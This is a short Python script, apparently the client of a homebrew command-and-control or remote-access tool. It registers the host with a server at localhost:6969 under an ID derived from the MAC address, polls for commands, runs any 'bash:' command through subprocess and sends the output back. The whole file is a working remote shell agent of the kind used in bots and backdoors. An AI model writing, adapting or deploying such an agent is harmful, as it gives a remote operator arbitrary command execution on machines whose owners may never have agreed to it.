#-*- coding:utf-8 -*-
import sys
sys.path.append("modules")

import requests,json
from time import sleep
from uuid import getnode as generateID
import subprocess

SERVER_URL = "http://localhost:6969/api/"
MY_ID = generateID()

def Init():
    r = requests.post(SERVER_URL + "init",data={"id": MY_ID})
    # :todo: aggiungere controlli sull'avvenuta connessione

def Polling():
    response = requests.get(SERVER_URL + "getUpdates?id={}".format(MY_ID))
    data = json.loads(response.text)
    print(data)
    if not data['command'] == None:
        return data['command']
    return False

def sendReponse(_data):
    response = requests.post(SERVER_URL+"getUpdates",data=_data)
    print(response)

def main():
    Init()
    #while(True):
    command = Polling()
    if command:
        print(command)        
        if command['command'][0:5] == 'bash:':
            output = subprocess.check_output(['bash','-c', command['command'][5:]]).decode('utf-8')
            sendReponse({'id':MY_ID,'command_id': command['id'],'response': output})
            print(output)
    #else:
    #    sleep(5)

if __name__ == "__main__":
    main()